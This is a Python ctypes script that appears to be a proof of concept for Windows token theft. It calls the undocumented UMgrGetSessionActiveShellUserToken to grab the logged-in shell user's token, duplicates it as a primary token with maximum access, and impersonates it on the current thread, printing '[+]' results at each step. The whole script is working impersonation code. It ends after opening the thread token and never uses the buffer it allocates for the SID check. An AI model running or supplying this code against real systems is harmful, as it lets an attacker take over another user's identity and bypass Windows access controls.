import ctypes
from ctypes import wintypes

advapi32 = ctypes.WinDLL("advapi32.dll")
k32 = ctypes.windll.kernel32
usertok = ctypes.WinDLL("ext-ms-win-session-usertoken-l1-1-0.dll")

p_shell_tok = getattr(usertok, "UMgrGetSessionActiveShellUserToken")
p_shell_tok.argtypes = [wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
p_shell_tok.restype = ctypes.c_long

hToken = wintypes.HANDLE()
hr = p_shell_tok(0, ctypes.byref(hToken))
print(f"[+] UMgrGetSessionActiveShellUserToken: hr=0x{hr & 0xFFFFFFFF:08X}, hToken=0x{(hToken.value or 0):X}")

# Duplicate token to primary token with TOKEN_ALL_ACCESS
hPrimary = wintypes.HANDLE()
ok_dup = advapi32.DuplicateTokenEx(
    hToken,
    0x10000000, # MAXIMUM_ALLOWED
    None,
    2, # SecurityImpersonation
    1, # TokenPrimary
    ctypes.byref(hPrimary)
)
print(f"[+] DuplicateTokenEx (TokenPrimary): ok={ok_dup}, hPrimary=0x{(hPrimary.value or 0):X}, Err={k32.GetLastError()}")

# Also try impersonating on the current thread
ok_imp = advapi32.ImpersonateLoggedOnUser(hToken)
print(f"[+] ImpersonateLoggedOnUser: ok={ok_imp}, Err={k32.GetLastError()}")

# Check current thread user SID
buf = ctypes.create_string_buffer(256)
ret_len = wintypes.DWORD()
hThreadTok = wintypes.HANDLE()
ok_open = advapi32.OpenThreadToken(k32.GetCurrentThread(), 0x0008, False, ctypes.byref(hThreadTok))
print(f"[+] OpenThreadToken: ok={ok_open}, hThreadTok=0x{(hThreadTok.value or 0):X}")

